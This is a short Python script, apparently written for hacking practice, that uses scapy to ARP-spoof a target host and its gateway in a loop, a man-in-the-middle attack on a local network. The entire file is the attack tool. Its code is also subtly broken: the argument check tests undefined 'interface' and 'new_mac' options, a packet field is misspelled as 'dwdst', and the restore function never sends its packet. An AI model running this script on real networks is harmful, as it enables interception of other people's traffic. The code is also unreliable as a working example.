from time import sleep as wait
import scapy.all as sc 
import optparse


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option('-t', '--target_ip', dest='target_ip', help='target_ip to fool')
    parser.add_option('-g', '--gateway_ip', dest='gateway_ip', help='gateway_ip to fool')
    options, argument = parser.parse_args()
    
    if not options.interface:
        parser.error('[-] Please specify an interface, use --help for more info')
    
    elif not options.new_mac:
        parser.error('[-] Please specify an MAC Address, use --help for more info')
    
    return options 


def get_mac(ip):    
    arp_request = sc.ARP(pdst = ip)
    broadcast = sc.Ether(dst = 'ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast/arp_request # creating the packet
    answered_list, unanswered_list = sc.srp(arp_request_broadcast, timeout=2, verbose=False) #sending the packet

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac =  get_mac(target_ip)
    packet = sc.ARP(op=2, pdst=target_ip, dwdst=target_mac, psrc=spoof_ip)
    sc.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)


    packet = sc.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)


sent_packet_count = 0

options = get_arguments()
target_ip = options.target_ip
gateway_ip = options.gateway_ip

try : 
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packet_count +=2
        print(f'\r[+] Sent Packets : {sent_packet_count}', end='')
        wait(0.8)

except KeyboardInterrupt:
    print('[-] Quitting ...')